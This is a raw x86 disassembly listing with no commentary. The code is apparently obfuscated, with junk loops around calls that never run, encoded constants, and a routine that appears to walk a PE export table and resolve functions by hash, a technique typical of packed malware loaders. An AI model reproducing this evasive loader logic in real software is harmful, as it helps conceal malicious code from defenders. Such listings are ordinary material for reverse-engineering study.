  42240e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42240f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422410:	or     dl,ah
  422412:	sub    al,0x5e
  422414:	jl     0x4223a6
  422416:	push   edi
  422417:	xchg   dh,cl
  422419:	cli    
  42241a:	pop    es
  42241b:	pop    ss
  42241c:	aam    0xa5
  42241e:	js     0x8f3d106a
  422424:	ds jns 0x422463
  422427:	outs   dx,DWORD PTR ds:[esi]
  422428:	repnz aad 0x50
  42242b:	sahf   
  42242c:	dec    edi
  42242d:	sbb    al,0xb5
  42242f:	jb     0x4223cd
  422431:	add    edx,DWORD PTR [ebp-0x51]
  422434:	xchg   ebp,eax
  422435:	inc    eax
  422436:	mov    ah,0x0
  422438:	shl    esi,0xf7
  42243b:	dec    ecx
  42243c:	dec    esp
  42243d:	mov    WORD PTR [esi+edx*2],?
  422440:	jns    0x422431
  422442:	mov    WORD PTR [esi-0x76],es
  422445:	arpl   WORD PTR [edx],ax
  422447:	inc    edi
  422448:	push   cs
  422449:	ss cmc 
  42244b:	fs mov edx,0xe7a85daa
  422451:	fadd   QWORD PTR [edi+0x8aab6]
  422457:	dec    DWORD PTR [ebx+0x7ed4bda1]
  42245d:	pop    edi
  42245e:	mov    esp,?
  422460:	mov    ah,0x25
  422462:	jmp    0x2f2cec26
  422467:	xor    edi,DWORD PTR [edx]
  422469:	data16 mov ch,ch
  42246c:	js     0x42248d
  42246e:	call   0x7f01:0xbc3d6c67
  422475:	inc    ebp
  422476:	jae    0x4224d3
  422478:	rcl    BYTE PTR [ebx-0x5c],cl
  42247b:	stos   DWORD PTR es:[edi],eax
  42247c:	ss push 0xc560aa9b
  422482:	cmp    eax,0x307fdea6
  422487:	sub    DWORD PTR [ecx],esi
  422489:	mov    bl,0x1d
  42248b:	or     ebx,DWORD PTR [edx-0x1c]
  42248e:	xchg   ebp,eax
  42248f:	mov    eax,0xf3691b16
  422494:	stc    
  422495:	outs   dx,BYTE PTR ds:[esi]
  422496:	adc    ecx,DWORD PTR [ebp+0x3a6df23f]
  42249c:	fstp   QWORD PTR [eax-0x1]
  42249f:	jne    0x42247d
  4224a1:	mov    BYTE PTR [eax],0xe9
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
